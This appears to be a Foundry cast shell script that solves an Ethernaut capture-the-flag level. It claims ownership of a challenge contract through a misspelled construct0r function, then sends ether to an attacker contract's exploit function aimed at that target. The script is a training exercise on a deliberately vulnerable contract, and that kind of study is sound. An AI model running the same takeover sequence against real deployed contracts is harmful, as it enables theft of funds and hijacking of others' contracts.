source ~/ethernauts/.env
echo "RPC_URL: $RPC_URL"

# cast call \
#     --rpc-url $RPC_URL \
#     --private-key $PRIVATE_KEY \
#     0xCb368591412FEe96Ba11E0De27cdfF545a644016 \
#     "trick()(address)"

# cast send \
#     --rpc-url $RPC_URL \
#     --private-key $PRIVATE_KEY \
#     0xCb368591412FEe96Ba11E0De27cdfF545a644016 \
#     "construct0r()()"


# now im owner
cast send \
    --rpc-url $RPC_URL \
    --private-key $PRIVATE_KEY \
    --value 0.0011ether \
    0x49bfd3E9b74363da12fC12a74365346641a2f442 \
    "exploit(address)()" 0xCb368591412FEe96Ba11E0De27cdfF545a644016

# cast call \
#     --rpc-url $RPC_URL \
#     0xCb368591412FEe96Ba11E0De27cdfF545a644016 \
#     "allowEntrance()(bool)"

# cast balance \
#     --rpc-url $RPC_URL \
#     0xCb368591412FEe96Ba11E0De27cdfF545a644016

